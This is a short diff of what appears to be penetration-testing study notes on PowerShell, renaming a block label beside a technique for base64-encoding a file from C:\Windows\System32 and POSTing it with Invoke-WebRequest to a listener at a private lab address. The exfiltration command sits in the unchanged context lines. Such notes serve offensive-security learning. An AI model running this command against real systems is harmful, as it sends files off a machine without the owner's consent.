@@ -50,7 +50,8 @@ $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\
 ```powershell
 Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
-^post-b64-file-content
+^send-b64-post
+
 ### Category 2
 
 **Get-ChildItem** is the PowerShell equivalent of dir
